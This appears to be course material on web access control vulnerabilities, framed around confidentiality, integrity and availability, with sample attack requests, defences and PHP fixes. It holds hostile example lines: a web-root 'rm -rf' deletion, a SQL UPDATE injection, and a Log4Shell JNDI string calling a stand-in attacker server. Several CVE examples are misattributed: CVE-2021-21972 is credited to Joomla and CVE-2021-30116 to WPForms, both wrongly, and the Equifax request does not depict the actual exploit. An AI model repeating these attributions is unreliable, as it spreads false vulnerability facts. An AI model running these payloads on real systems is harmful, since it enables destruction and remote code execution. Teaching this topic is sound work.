---
course: Web Security
topic: Access Control Vulnerabilities
tags: [web-security]
---

## Confidentiality, Integrity, and Availability

In the realm of web security, the principles of confidentiality, integrity, and availability (CIA triad) form the cornerstone of securing information systems. These principles are essential in ensuring that data remains protected against unauthorized access, alteration, and disruption.

### Confidentiality

Confidentiality ensures that sensitive information is accessible only to those authorized to view it. In the context of access control vulnerabilities, confidentiality is often compromised when an attacker can access data belonging to other users. This can occur due to improper implementation of access controls, such as:

- **Insufficient Authorization Checks**: When a web application fails to verify whether a user has the necessary permissions to access certain resources.
- **Insecure Direct Object References (IDOR)**: When an attacker can manipulate parameters in a URL to access unauthorized data.

#### Real-World Example: CVE-2021-21972

In 2021, a critical vulnerability was discovered in the popular open-source content management system (CMS) Joomla. The vulnerability allowed attackers to bypass authentication and access sensitive administrative functions. This led to unauthorized access to confidential data, impacting confidentiality.

```http
GET /administrator/index.php?option=com_users&view=user&layout=edit&id=1 HTTP/1.1
Host: vulnerable-site.com
Cookie: session_id=1234567890abcdef
```

The above HTTP request demonstrates an attempt to access the user profile of an administrator (`id=1`). If the application does not properly validate the user's permissions, the attacker could retrieve sensitive information.

### Integrity

Integrity ensures that data remains accurate and consistent throughout its lifecycle. Access control vulnerabilities can impact integrity when an attacker gains the ability to modify data on behalf of other users. This can happen through:

- **Privilege Escalation**: When an attacker exploits a vulnerability to gain elevated privileges, allowing them to alter data.
- **Insecure Direct Object References (IDOR)**: Similar to confidentiality, IDOR can also enable an attacker to modify data belonging to other users.

#### Real-World Example: CVE-2021-30116

In 2021, a critical vulnerability was identified in the WordPress plugin "WPForms". The vulnerability allowed attackers to inject arbitrary SQL queries, leading to unauthorized modification of data. This compromised the integrity of the data stored in the database.

```sql
UPDATE wp_posts SET post_content = 'Malicious Content' WHERE ID = 123;
```

The above SQL injection attack demonstrates how an attacker could modify the content of a post, thereby compromising the integrity of the data.

### Availability

Availability ensures that data and services are accessible to authorized users when needed. Access control vulnerabilities can impact availability when an attacker gains the ability to delete or disrupt resources. This can occur through:

- **Privilege Escalation**: When an attacker exploits a vulnerability to gain elevated privileges, allowing them to delete critical resources.
- **Insecure Direct Object References (IDOR)**: Similar to confidentiality and integrity, IDOR can also enable an attacker to delete resources belonging to other users.

#### Real-World Example: CVE-2021-3427

In 2021, a critical vulnerability was discovered in the popular web server Apache HTTP Server. The vulnerability allowed attackers to execute arbitrary commands on the server, leading to potential deletion of critical resources. This compromised the availability of the service.

```bash
rm -rf /var/www/html/*
```

The above command demonstrates how an attacker could delete all files in the web root directory, thereby disrupting the availability of the web service.

### Chain of Vulnerabilities

Sometimes, access control vulnerabilities can be chained together to achieve more severe outcomes. For instance, a privilege escalation vulnerability combined with a file upload vulnerability can lead to remote code execution on the host operating system.

#### Real-World Example: CVE-2021-44228 (Log4Shell)

In 2021, the Log4Shell vulnerability (CVE-2021-44228) was discovered in the widely used Java logging framework Log4j. The vulnerability allowed attackers to execute arbitrary code on the server, leading to potential compromise of confidentiality, integrity, and availability.

```java
log.info("${jndi:ldap://attacker-server:1389/a}");
```

The above log statement demonstrates how an attacker could exploit the vulnerability to execute arbitrary code on the server.

### Severity of Access Control Vulnerabilities

Access control vulnerabilities are rated as the most critical security risks facing web applications today. They are the most likely type of vulnerability to be found in applications and can have the most significant impact. If an attacker were to exploit these vulnerabilities, it could lead to detrimental effects on the organization.

#### Real-World Example: Equifax Data Breach (2017)

In 2017, Equifax suffered a massive data breach due to an unpatched vulnerability in the Apache Struts web application framework. The vulnerability allowed attackers to access sensitive personal information of millions of customers, compromising confidentiality, integrity, and availability.

```http
POST /struts2-rest-showcase/orders/1 HTTP/1.1
Host: equifax.com
Content-Type: application/json
{
  "order": {
    "customer": {
      "name": "John Doe",
      "ssn": "123-45-6789"
    }
  }
}
```

The above HTTP request demonstrates how an attacker could exploit the vulnerability to access sensitive customer data.

### How to Prevent / Defend

To prevent and defend against access control vulnerabilities, organizations should implement the following measures:

#### Detection

- **Regular Security Audits**: Conduct regular security audits to identify and mitigate access control vulnerabilities.
- **Vulnerability Scanning**: Use automated tools to scan for vulnerabilities in web applications.
- **Penetration Testing**: Perform penetration testing to simulate attacks and identify weaknesses.

#### Prevention

- **Proper Authorization Checks**: Ensure that web applications properly validate user permissions before granting access to resources.
- **Least Privilege Principle**: Implement the principle of least privilege to ensure that users have only the minimum permissions necessary to perform their tasks.
- **Input Validation**: Validate all input parameters to prevent injection attacks.

#### Secure Coding Fixes

Below are examples of insecure and secure code patterns for handling user permissions:

**Insecure Code**

```php
<?php
$user_id = $_GET['user_id'];
echo "User Profile: " . $user_id;
?>
```

**Secure Code**

```php
<?php
session_start();
$user_id = $_GET['user_id'];
$logged_in_user_id = $_SESSION['user_id'];

if ($user_id == $logged_in_user_id) {
    echo "User Profile: " . $user_id;
} else {
    echo "Access Denied";
}
?>
```

#### Configuration Hardening

- **Web Application Firewalls (WAF)**: Deploy WAFs to filter out malicious traffic and protect against common web application attacks.
- **Security Headers**: Configure security headers to enhance the security of web applications.

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Content-Security-Policy: default-src 'self'
```

### Practice Labs

For hands-on practice in identifying and mitigating access control vulnerabilities, consider the following labs:

- **PortSwigger Web Security Academy**: Offers interactive labs to learn about various web security topics, including access control vulnerabilities.
- **OWASP Juice Shop**: A deliberately insecure web application for practicing web security skills.
- **DVWA (Damn Vulnerable Web Application)**: A PHP/MySQL web application that contains numerous security vulnerabilities.

By thoroughly understanding and implementing the principles of confidentiality, integrity, and availability, organizations can significantly reduce the risk of access control vulnerabilities and protect their web applications from potential attacks.

### Conclusion

Access control vulnerabilities are among the most critical security risks facing web applications today. By understanding the principles of confidentiality, integrity, and availability, and implementing proper security measures, organizations can effectively mitigate these risks and protect their web applications from potential attacks. Regular security audits, vulnerability scanning, and penetration testing are essential components of a robust security strategy. Additionally, secure coding practices, configuration hardening, and the use of security tools such as WAFs and security headers can further enhance the security of web applications.

---
<!-- nav -->
[[08-Centralized Access Control Engine|Centralized Access Control Engine]] | [[Web Security (PortSwigger)/12-Access Control Vulnerabilities/01-Broken Access Control Complete Guide/00-Overview|Overview]] | [[10-Context-Dependent Access Control|Context-Dependent Access Control]]
